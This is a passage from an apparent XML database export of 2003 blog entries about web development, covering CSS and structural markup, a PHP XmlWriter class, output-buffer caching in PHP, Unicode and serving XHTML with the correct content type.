		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_04_27_archive.shtml#lcky93408794&quot;&gt;Craig Saila&lt;/a&gt;, Christopher Schmitt's &lt;a href=&quot;http://www.cssbook.com/resources/css/headings/&quot;&gt;50 CSS Headings&lt;/a&gt;. Free &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; code snippets is definitely an idea who's time has come - there are hundreds of copy-and-paste javascript sites out there but hardly any for &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; (discounting the many excellent full layout sites). Mark Newhouse's extremely popular &lt;a href=&quot;http://www.alistapart.com/stories/taminglists/&quot;&gt;CSS Design: Taming Lists&lt;/a&gt; article does the same thing for lists but other than that this kind of resource is extremely rare. Web developers not interested in moving to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; completely can still benefit hugely from using it in their current sites in place of nested formatting tables and presentational tags used to give the visual appearance of headings, so the more of this kind of thing out there the better.&lt;/p&gt;</field>
		<field name="created">2003-04-28 20:13:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">951</field>
		<field name="title">Fixed Point Arithmetic in Python</field>
		<field name="slug">fixedPoint</field>
		<field name="body">&lt;p&gt;The Python Tutorial now includes a new appendix on &lt;a href=&quot;http://www.python.org/doc/current/tut/node14.html&quot; title=&quot;Floating Point Arithmetic: Issues and Limitations&quot;&gt;the limitations of floating point arithmetic&lt;/a&gt;. Via &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000710.html#000710&quot; title=&quot;Floating Point Arithmetic: Issues and Limitations&quot;&gt;Simon Brunning&lt;/a&gt;, who also linked to the lengthier &lt;a href=&quot;http://docs.sun.com/source/806-3568/ncg_goldberg.html&quot;&gt;What Every Computer Scientist Should Know About Floating-Point Arithmetic&lt;/a&gt; almost exactly &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000009.html#000009&quot; title=&quot;What Every Computer Scientist Should Know About Floating-Point Arithmetic&quot;&gt;a year ago&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-28 20:20:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">952</field>
		<field name="title">Tim Bray on Unicode</field>
		<field name="slug">ongoingOnUnicode</field>
		<field name="body">&lt;p&gt;Tim Bray's &lt;a href=&quot;http://tbray.org/ongoing/&quot;&gt;ongoing&lt;/a&gt; really is one of the best technical blogs out there (if it even &lt;a href=&quot;http://tbray.org/ongoing/WhatItIs&quot; title=&quot;What This Is&quot;&gt;is a blog&lt;/a&gt;). One of his current topics is Unicode, which is one of those topics that pretty much every software developer should try to get under their belt. &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/04/06/Unicode&quot;&gt;On the Goodness of Unicode&lt;/a&gt; gives a thorough, entertaining overview of the subject (including its importance and why it isn't as scary as it sounds) while &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/04/26/UTF&quot;&gt;Characters vs. Bytes&lt;/a&gt; is the first in a promised three part essay covering the technical details of modern character processing.&lt;/p&gt;</field>
		<field name="created">2003-04-28 20:38:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">953</field>
		<field name="title">Threads and Dynamic Content</field>
		<field name="slug">threadsAndDynamicContent</field>
		<field name="body">&lt;p&gt;Sterling Hughes: &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000168.html&quot;&gt;THOU SHALT NOT USE THREADS TO SERVE DYNAMIC CONTENT&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-29 19:54:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">954</field>
		<field name="title">Skill Swap</field>
		<field name="slug">skillSwap</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.zeldman.com/daily/0403b.shtml#conferences&quot; title=&quot;No end of free&quot;&gt;Zeldman&lt;/a&gt;, &lt;a href=&quot;http://skillswap.brightonnewmedia.org/&quot;&gt;Skill Swap&lt;/a&gt; is a community based new mania free training scheme based in Brighton:&lt;/p&gt;

&lt;blockquote cite=&quot;http://skillswap.brightonnewmedia.org/&quot;&gt;
&lt;p&gt;SkillSwap is a voluntary group set up by members of the local web design community and specifically members of the Brighton New Media mailing list.&lt;/p&gt;

&lt;p&gt;The idea is that on a semi-regular basis, people from the local new media community volunteer to give up some of their free time to train a small group of their peers in a subject that interests them.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It piqued my interest because it seems to be similar to the model we're hoping to achieve with our student computer society, &lt;a href=&quot;http://www.bcss.info/&quot;&gt;BCSS&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-29 23:30:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">955</field>
		<field name="title">XmlWriter: Generating XML from PHP</field>
		<field name="slug">xmlWriter</field>
		<field name="body">&lt;p&gt;Lars Marius Garshol's &lt;a href=&quot;http://www.xml.com/pub/a/2003/04/09/py-xml.html&quot;&gt;XMLWriter class&lt;/a&gt; for Python struck me as a particularly elegant solution for generating simple &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; documents without having to worry about encoding issues, missing tags and so forth - so I re-implemented it in &lt;acronym title=&quot;PHP: HyperText Preprocessor&quot;&gt;PHP&lt;/acronym&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/code/php/XmlWriter.class.php.txt&quot;&gt;XmlWriter.class.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Example code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$array = array(
    array('monkey', 'banana', 'Jim'),
    array('hamster', 'apples', 'Kola'),
    array('turtle', 'beans', 'Berty'),
);
$xml = new XmlWriter();
$xml-&amp;gt;push('zoo');
foreach ($array as $animal) {
    $xml-&amp;gt;push('animal', array('species' =&amp;gt; $animal[0]));
    $xml-&amp;gt;element('name', $animal[2]);
    $xml-&amp;gt;element('food', $animal[1]);
    $xml-&amp;gt;pop();
}
$xml-&amp;gt;pop();
print $xml-&amp;gt;getXml();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which produces this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
&amp;lt;zoo&amp;gt;
  &amp;lt;animal species=&quot;monkey&quot;&amp;gt;
    &amp;lt;name&amp;gt;Jim&amp;lt;/name&amp;gt;
    &amp;lt;food&amp;gt;banana&amp;lt;/food&amp;gt;
  &amp;lt;/animal&amp;gt;
  &amp;lt;animal species=&quot;hamster&quot;&amp;gt;
    &amp;lt;name&amp;gt;Kola&amp;lt;/name&amp;gt;
    &amp;lt;food&amp;gt;apples&amp;lt;/food&amp;gt;
  &amp;lt;/animal&amp;gt;
  &amp;lt;animal species=&quot;turtle&quot;&amp;gt;
    &amp;lt;name&amp;gt;Berty&amp;lt;/name&amp;gt;
    &amp;lt;food&amp;gt;beans&amp;lt;/food&amp;gt;
  &amp;lt;/animal&amp;gt;
&amp;lt;/zoo&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</field>
		<field name="created">2003-04-29 23:44:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">956</field>
		<field name="title">In praise of functional programming</field>
		<field name="slug">functionalProgramming</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://bitworking.org/news/Snippets&quot;&gt;Joe Gregorio&lt;/a&gt;, Functional programming in Python &lt;a href=&quot;http://www-106.ibm.com/developerworks/library/l-prog.html&quot; title=&quot;Making more out of your favorite scripting language&quot;&gt;Part 1&lt;/a&gt; and &lt;a href=&quot;http://www-106.ibm.com/developerworks/library/l-prog2.html&quot; title=&quot;Wading into functional programming?&quot;&gt;Part 2&lt;/a&gt;. I'm reading &lt;a href=&quot;http://mitpress.mit.edu/sicp/&quot;&gt;Structure and Interpretation of Computer Programs&lt;/a&gt; at the moment (available for free online, but I've got a library copy) and it has been getting me seriously interested in the functional programming paradigm. It's also by far the most enlightening (in terms of &quot;wow, that really makes sense&quot;) computer science text book I've ever read. There's something naturally elegant about the functional style, probably thanks to the encapsulation encouraged by the lack of global variables and the extensive use of recursion in functional code examples. It's definitely true that exposure to a variety of programming styles encourages you to think about problems in different ways.&lt;/p&gt;</field>
		<field name="created">2003-04-29 23:57:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">957</field>
		<field name="title">Firebird Switch Campaign</field>
		<field name="slug">firebirdSwitch</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.mozilla.org/projects/phoenix/why/&quot;&gt;Why You Should Switch to the Mozilla Firebird&lt;/a&gt; by Ben Goodger is an excellent overview of Firebird's advantages over other browsers, hosted on the Phoenix project site. I'm really looking forward to the release of 0.6 as a good, stable, easy to use browser I can recommend to non-geeky friends.&lt;/p&gt;</field>
		<field name="created">2003-05-01 15:06:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">958</field>
		<field name="title">Feedster AND searching</field>
		<field name="slug">feedster</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.feedster.com/&quot;&gt;Feedster&lt;/a&gt; finally &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/04/30.html#a1614&quot; title=&quot;Two Big Feedster Changes ...&quot;&gt;supports AND&lt;/a&gt; as the default search operator. This is a very good thing. I've decided to leave this site's &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/25/siteSearch&quot; title=&quot;Site search finally available&quot;&gt;search engine&lt;/a&gt; as using OR, mainly because I feel for a small search set (approximately a thousand entries) more search results is better than fewer search results and because relevancy algorithm used by MySQL to order the results appears to be working extremely well. For large data sets such as Feedster or Google I definitely prefer to only see results containing all of my search terms.&lt;/p&gt;</field>
		<field name="created">2003-05-01 15:12:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">959</field>
		<field name="title">XUL and PHP</field>
		<field name="slug">xulAndPhp</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.phppatterns.com/index.php/article/articleview/45/1/2/&quot;&gt;XUL: rendering GUIs with PHP&lt;/a&gt; and &lt;a href=&quot;http://www.phppatterns.com/index.php/article/articleview/48/1/2/&quot;&gt;XUL to PHP-GTK&lt;/a&gt;, both on the excellent &lt;a href=&quot;http://www.phppatterns.com/&quot;&gt;phpPatterns()&lt;/a&gt;. If you're using a Gecko-based browser be sure to check out the &lt;a href=&quot;http://xul.phppatterns.com/&quot;&gt;XUL Interface to phpPatterns()&lt;/a&gt; proof-of-concept, which adds an &lt;acronym title=&quot;eXtensible User interface Language&quot;&gt;XUL&lt;/acronym&gt; powered menu bar to the browser chrome at the top of the page.&lt;/p&gt;</field>
		<field name="created">2003-05-01 15:18:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">960</field>
		<field name="title">iTunes Web Service?</field>
		<field name="slug">iTunesWebService</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/04/30/AppleWA&quot; title=&quot;iTunes Music Store and the WWW&quot;&gt;Tim Bray&lt;/a&gt;, it turns out Apple's new iTunes Music Store is driven under the hood by a whole load of XML documents, which are &lt;a href=&quot;http://phobos.apple.com/WebObjects/MZSearch.woa/wa/advancedSearchResults?songTerm=Walk%20Don&amp;apos;t%20Run.&quot; title=&quot;Example search for &amp;quot;Walk Don&amp;apos;t Run&amp;quot;&quot;&gt;available via HTTP&lt;/a&gt;. Here's hoping this leads to something similar to the &lt;a href=&quot;http://associates.amazon.com/exec/panama/associates/join/developer/resources.html&quot;&gt;Amazon Web Services API&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-05-01 15:23:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">961</field>
		<field name="title">Defending Structural Markup</field>
		<field name="slug">structuralMarkup</field>
		<field name="body">&lt;p&gt;I've been somewhat taken by surprise by the latest round of anti-&lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rants (initiated by &lt;a href=&quot;http://www.livejournal.com/users/jwz/193866.html&quot; title=&quot;jwz: CSS is BS&quot;&gt;JWZ&lt;/a&gt;, followups &lt;a href=&quot;http://www.technorati.com/cosmos/links.html?url=http%3A%2F%2Fwww.livejournal.com%2Fusers%2Fjwz%2F193866.html&quot; title=&quot;technorati link cosmos for JWZ&amp;apos;s rant&quot;&gt;all over the place&lt;/a&gt;), mainly because I've been using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for long enough now that I'd started to forget about the legions of web developers out there who haven't yet realised what they're missing. Instead of getting stuck in to dissecting other people's complaints I'm just going to lay down a few of my own core beliefs.&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;If you work with the web professionally and you have not yet started using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, you are doing both yourself, your clients and your profession a disservice.&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;&lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; may not be a magic bullet, but it offers far more effective ways of creating attractive web pages than &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; alone. &quot;Effective&quot; in this case means maintainable, efficient and accessible.&lt;/li&gt;
 &lt;li&gt;&lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is not rocket science! While browser compatibility issues can certainly cause teething problems, they can be defeated with a little perseverance. Basic &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; (of the kind that can replace several layers of nested tables and spacer gifs) can be picked up in very little time with a huge pay back in increased productivity.&lt;/li&gt;
&lt;li&gt;You don't have to ditch layout tables and stop using about presentational markup to begin to enjoy the benefits of structural markup and &lt;acronym title=&quot;Cascadin gStyle Sheets&quot;&gt;CSS&lt;/acronym&gt;! (&lt;em&gt;Added 30 minutes after initial publication&lt;/em&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;And now some clarification. The core issue I am interested in isn't &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; vs Tables, it's structural vs presentational markup. To clarify those terms, presentational markup is when you use &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; markup tags purely to control the &quot;look&quot; of your site in desktop browsers, while structural markup is when you use tags to provide a logical structure to a document and keep visual display information separate, generally through use of a stylesheet. The two are not mutually exclusive; for practical reasons, it is often necessary to add markup to a document for purely presentational reasons. The trick is to minimise this as much as possible.&lt;/p&gt;

&lt;p&gt;Why is separating structure from presentation a good idea? From a theoretical point of view, the answer should be obvious: separating the two adds a powerful additional layer of abstraction which allows either to be modified without needing to make changes to the other. The practical benefits come in the form of increased accessibility, better maintainability  and greatly reduced amounts of code (compare the size of a presentational &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; page to that of one that uses structural markup and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;). Being able to change the look of a whole site by modifying a single &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; file is Finally, the ability to re-use content is greatly increased as the clean structure makes it far easier for content to be remoulded for other distribution mediums.&lt;/p&gt;

&lt;p&gt;It is true that there are some things (in particular relating to layout) that cannot yet be reliably achieved using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rather than presentational tables, almost entirely due to bugs in modern browser implementations of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. It is also true that there are a lot of layout effects that cannot be achieved using purely presentational markup. All web designers should be aware that they are working within the limitations of their medium - if you want pixel perfect control of how something appears then go and play with Flash (and throw universal access to content to the wind). Alternatively, the &quot;transitional&quot; approach where presentational markup is used only when there is no other alternative) is a perfectly valid way approach to modern web design.&lt;/p&gt;

&lt;p&gt;Enough ranting: I'm going to put my money where my mouth is. Over the next few weeks I will give this blog over to a complete course in structural &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, aimed at web developers who know their way around &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; but haven't yet come to terms with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; - kind of like &lt;a href=&quot;http://diveintoaccessibility.org/&quot;&gt;Dive Into Accessibility&lt;/a&gt; with a different focus. I haven't planned this, so I have no idea how long it will take or exactly what it will cover. I'm hoping it will lead to some lively discussions and help drag a few more web developers out of the 90s.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Having re-read the above it doesn't quite say what I wanted it to. My key point was going to be that CSS may not be perfect, and it may not yet be a complete replacement for presentational markup, but it's an ultra-powerful tool that is ready to be used &lt;em&gt;now&lt;/em&gt; and should have a place in any web professional's toolbox. The promise of a tutorial series still stands.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update 2:&lt;/strong&gt; I've &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/06/cssTutorialDelayed&quot; title=&quot;Delay to the start of my CSS tutorial series&quot;&gt;delayed&lt;/a&gt; the planned start of my &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; tutorial series by a week or two.&lt;/p&gt;</field>
		<field name="created">2003-05-04 14:20:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">962</field>
		<field name="title">Strong Typing vs Strong Testing</field>
		<field name="slug">strongTesting</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://mindview.net/WebLog/log-0025&quot;&gt;Strong Typing vs. Strong Testing&lt;/a&gt;, Bruce Eckel reconsiders the old idea that languages without strong typing can't be relied on to create large programs:&lt;/p&gt;

&lt;blockquote cite=&quot;http://mindview.net/WebLog/log-0025&quot;&gt;&lt;p&gt;This became a puzzle to me: if strong static type checking is so important, why are people able to build big, complex Python programs (with much shorter time and effort than the strong static counterparts) without the disaster that I was so sure would ensue?&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;His conclusion is that type checking by the compiler does not garauntee the correctness of a program in the first place; it's just another test. Comprehensive unit testing can more than compensate for the lack of type checking in languages such as Python, especially since the huge productivity bonus provided by Python allows more tests to be written starting at an earlier stage in development.&lt;/p&gt;

&lt;p&gt;Incidentally, Bruce recently &lt;a href=&quot;http://mindview.net/WebLog/log-0022&quot; title=&quot;RSS Feed up&quot;&gt;added an RSS feed&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-05-04 20:32:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">963</field>
		<field name="title">Achieving standards compliance and a list of DTDs</field>
		<field name="slug">standardsCompliance</field>
		<field name="body">&lt;p&gt;Via the &lt;a href=&quot;http://www.webstandards.org/buzz/archive/2003_04.html#a000154&quot; title=&quot;We do declare:&quot;&gt;WaSP blog&lt;/a&gt; (I wish they would ping Weblogs.com), &lt;a href=&quot;http://www.w3.org/QA/2002/04/Web-Quality&quot;&gt;How to achieve web standards and quality on your web site&lt;/a&gt; and &lt;a href=&quot;http://www.w3.org/QA/2002/04/valid-dtd-list.html&quot;&gt;List of valid DTDs you can use in your document&lt;/a&gt;, both by the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; &lt;acronym title=&quot;Quality Assurance&quot;&gt;QA&lt;/acronym&gt; team. The former includes a great selection of questions and answers to typical reasons for not using standards (as well as some great tips on how to create standard compliant sites) while the latter finally provides all of the &lt;acronym title=&quot;Document Type Definition&quot;&gt;DTD&lt;/acronym&gt;s in one place.&lt;/p&gt;</field>
		<field name="created">2003-05-04 22:45:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">964</field>
		<field name="title">Better structural markup rants</field>
		<field name="slug">structuralMarkupRants</field>
		<field name="body">&lt;p&gt;Better structural markup rants than &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/04/structuralMarkup&quot; title=&quot;Defending Structural Markup&quot;&gt;mine&lt;/a&gt;: Owen Briggs' classic &lt;a href=&quot;http://www.thenoodleincident.com/tutorials/design_rant/&quot;&gt;Design Rant&lt;/a&gt; and Craig Saila's &lt;a href=&quot;http://www.saila.com/usage/layouts/cssvtables.shtml&quot;&gt;Tables or CSS? Choosing a Layout&lt;/a&gt;. Incidentally, my rant has sparked some &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/04/structuralMarkup#comments&quot;&gt;excellent feedback&lt;/a&gt; in the comments section.&lt;/p&gt;</field>
		<field name="created">2003-05-05 20:26:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">965</field>
		<field name="title">Instant caching with PHP</field>
		<field name="slug">cachingWithPHP</field>
		<field name="body">&lt;p&gt;I've been getting more database timeout errors today, probably due to increased traffic from links to recent entries. A permanent solution would be to switch to generating static &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; (this site is currently dynamically generated for every request), but I don't have time for a full re-write at the moment. Luckily, &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; offers an extremely simple solution to dynamic caching in the form of &lt;a href=&quot;http://www.php.net/manual/en/ref.outcontrol.php&quot;&gt;output buffering&lt;/a&gt;. The front page of the site (which generates by far the most traffic) is now served from a cached copy if it has been cached within the last 5 minutes. Best of all, I didn't have to edit any of my core application logic - I just dropped in some extra code at the top and bottom of the &lt;code&gt;index.php&lt;/code&gt; file. Here's how it works:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
$cachefile = 'cache/index-cached.html';
$cachetime = 5 * 60;
// Serve from the cache if it is younger than $cachetime
if (file_exists($cachefile) &amp;amp;&amp;amp; time() - $cachetime &amp;lt; filemtime($cachefile)) {
    include($cachefile);
    echo &quot;&amp;lt;!-- Cached copy, generated &quot;.date('H:i', filemtime($cachefile)).&quot; --&amp;gt;\n&quot;;
    exit;
}
ob_start(); // Start the output buffer

/* The code to dynamically generate the page goes here */

// Cache the output to a file
$fp = fopen($cachefile, 'w');
fwrite($fp, ob_get_contents());
fclose($fp);
ob_end_flush(); // Send the output to the browser
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I've added a few extra bits of logic to check that the page being cached isn't itself a database error page, but the above is the bulk of the code. Best of all, due to the nature of output buffering it should work on practically any &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; application.&lt;/p&gt;</field>
		<field name="created">2003-05-05 23:05:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">966</field>
		<field name="title">Living on a knife edge</field>
		<field name="slug">knifeEdge</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://www.goer.org/Journal/2003/Apr/index.html&quot;&gt;The XHTML 100&lt;/a&gt;, Evan Goer describes an experiment in which he checked 119 site claiming to be with an &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; doctype for full compliance with the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; standards. His test consisted of three parts - a validation check on the front page, a check on another &quot;inside&quot; page, and a check to see if the correct Content-Type header (&lt;code&gt;application/xhtml+xml&lt;/code&gt;) was served to supporting User Agents (in his case Mozilla 1.3).&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://www.goer.org/Journal/2003/Apr/index.html#results&quot;&gt;results&lt;/a&gt; are depressing, but not necessarily surprising. Only one site passed all three tests - &lt;a href=&quot;http://www.beandizzy.com/&quot;&gt;beandizzy&lt;/a&gt;. Of the others, most fell at the first hurdle with only 13 getting as far as the third test.&lt;/p&gt;

&lt;p&gt;I don't know if my site was included in the experiment, but if it was it failed at the third test as well. I have now implemented Mark Pilgrim's &lt;a href=&quot;http://www.xml.com/pub/a/2003/03/19/dive-into-xml.html&quot; title=&quot;XHTML&amp;apos;s Dirty Little Secret&quot;&gt;trivial PHP fix&lt;/a&gt; (which serves the correct Content-Type to user agents that include &lt;code&gt;application/xhtml+xml&lt;/code&gt; in their &lt;code&gt;HTTP-ACCEPT&lt;/code&gt; header). This is no small step to take - serving &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; with the correct Content-Type causes Gecko based browsers to attempt to parse it using a real &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser, and should it turn out to be well formed they will refuse to render the site and die with an error message. Since I use Phoenix myself and almost certainly visit this site more than anyone else I'm hoping I'll spot and fix any errors before anyone else runs in to them. Talk about living on a knife edge!&lt;/p&gt;

&lt;p&gt;I've been cautious about recommending &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; for several months now, and this turn of events has made me even more wary of it as a technology that is ready for mainstream use. Creating valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; documents is extremely difficult - virtually impossible by hand without regular checks with the validator, and hard to achieve using home grown tools as well. I plan to revise my &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/28/w3cValidatorWebService&quot;&gt;Validator Web Service&lt;/a&gt; code shortly to help run automated validation checks whenver I update, but it's going to take quite a lot of effort to keep things working as they should.&lt;/p&gt;

&lt;p&gt;So why bother when &lt;acronym title=&quot;Hyper Text Markup Language&quot;&gt;HTML&lt;/acronym&gt; 4.01 Strict gives all of the benefits of structural, valid markup  with none of the additional hassles provided by &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;? 6 months ago I would have said that &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is vital to support new light weight devices that can only handle an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser, but with mobile phones carrying full tag-soup capable web browsers that's looking more and more unlikely. The greatest benefit provided by valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is the increased ability to automate the extraction and processing of content at a later date (see Mark Pilgrim's acclaimed acronym and citation support for a concrete demonstration of this idea). I've been storing my blog entries as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; since I started blogging, and I maintain a firm belief that &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is an excellent format for storing items of content. Sadly, it just doesn't seem practical or worthwhile to serve it to browsers.&lt;/p&gt;

&lt;p&gt;I'm going to keep serving this blog as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; as an open experiment in the practicalities and challenges involved in doing so, but from now on my other web projects will target HTML 4.01 Strict.&lt;/p&gt;</field>
		<field name="created">2003-05-06 13:50:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">967</field>
		<field name="title">New mozgest soon</field>
		<field name="slug">newMozgestSoon</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.surfmind.com/musings/2003/05/05/index.cfm#optimoz&quot; title=&quot;Mozilla RDF Foo&quot;&gt;AndyEd&lt;/a&gt; on the &lt;a href=&quot;http://optimoz.mozdev.org/gestures/&quot;&gt;Mozilla gestures project&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.surfmind.com/musings/2003/05/05/index.cfm#optimoz&quot;&gt;&lt;p&gt;
We're actually on the cusp of a huge new release with awesome customization features including complete customization of rocker (mouse button) mappings.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Sweet. Gestures is still the first thing I install when I set up Mozilla or Phoenix. Hopefully the configuration options in the new release will work with the latest nightly FireBird builds.&lt;/p&gt;</field>
		<field name="created">2003-05-06 14:09:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">968</field>
		<field name="title">Delay to the start of my CSS tutorial series</field>
		<field name="slug">cssTutorialDelayed</field>
		<field name="body">&lt;p&gt;I still plan to go ahead with a CSS tutorial series, &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/04/structuralMarkup&quot; title=&quot;Defending Structural Markup&quot;&gt;as promised&lt;/a&gt;. I'm delaying the start, partly to give myself time to work out a good structure for the series, but mainly because I have a shed load of coursework due in a week today that desperately needs my full attention.&lt;/p&gt;</field>
		<field name="created">2003-05-06 14:26:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">969</field>
		<field name="title">The CSS Zen Garden</field>
		<field name="slug">cssZenGarden</field>
		<field name="body">&lt;p&gt;This is something we've needed for a long time. The &lt;a href=&quot;http://www.csszengarden.com/&quot;&gt;CSS Zen Garden&lt;/a&gt; demonstrates &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; as used by graphic designers, and is a truly beautiful sight to behold. It currently showcases 5 radically different designs all using exactly the same markup, and invites further contributions from other designers. Finally, a proper demonstration that standards compliant, accessible, &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; driven web sites do not have to be boring or ugly.&lt;/p&gt;</field>
		<field name="created">2003-05-08 14:34:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">970</field>
		<field name="title">All Courseworked Out</field>
		<field name="slug">courseworkedOut</field>
